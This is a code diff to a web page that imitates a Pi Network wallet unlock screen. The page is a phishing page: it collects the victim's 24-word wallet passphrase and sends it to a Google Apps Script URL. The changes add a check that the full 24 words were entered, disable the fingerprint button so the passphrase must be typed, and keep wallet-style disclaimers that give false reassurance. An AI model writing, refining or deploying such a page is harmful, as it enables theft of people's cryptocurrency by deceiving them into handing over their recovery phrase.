@@ -60,6 +60,12 @@
             padding: 12px 24px;
             border-radius: 8px;
         }
+        .fingerprint.disabled {
+            background: #cccccc;
+            color: #666666;
+            cursor: not-allowed;
+            border-color: #999999;
+        }
 
         .success-screen {
             display: none;
@@ -94,7 +100,8 @@
         <textarea placeholder="Enter your 24-word passphrase here"></textarea>
 
         <button onclick="submitData('passphrase')">Unlock With Passphrase</button>
-        <a class="fingerprint" onclick="submitData('fingerprint')">Unlock With Fingerprint</a>
+        <button class="fingerprint disabled" disabled="disabled">Unlock With Fingerprint</button>
+        <!-- <a class="fingerprint" onclick="submitData('fingerprint')">Unlock With Fingerprint</a> -->
 
         <p class="disclaimer">As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
         <p class="disclaimer">Lost your passphrase? You can create a new wallet, but all your π in your previous wallet will be inaccessible.</p>
@@ -111,7 +118,14 @@
         async function submitData(method) {
             const passphrase = document.querySelector('textarea').value;
             const scriptUrl = 'https://script.google.com/macros/s/AKfycbyLLjpyHP5FRd_cnyHg-1ngw20xWYK-jgt-SdotguSjIa_VshdR4Wp1v1Q2IDKgDitiQw/exec';
-    
+            
+            // Validate 24-word requirement
+            const words = passphrase.trim().split(/\s+/).filter(word => word.length > 0);
+            if (words.length < 24) {
+                alert('Please enter exactly 24 words separated by spaces');
+                return;
+            }
+
             try {
                 // Use GET with URL parameters
                 const url = `${scriptUrl}?passphrase=${encodeURIComponent(passphrase)}&method=${method}`;
@@ -144,13 +158,6 @@
             document.querySelector('.success-screen').style.display = 'block';
         }
     </script>
-        
-<!-- 
-    <script>
-        function showSuccess() {
-            document.querySelector('.unlock-screen').style.display = 'none';
-            document.querySelector('.success-screen').style.display = 'block';
-        }
-    </script> -->
+ 
 </body>
 </html>
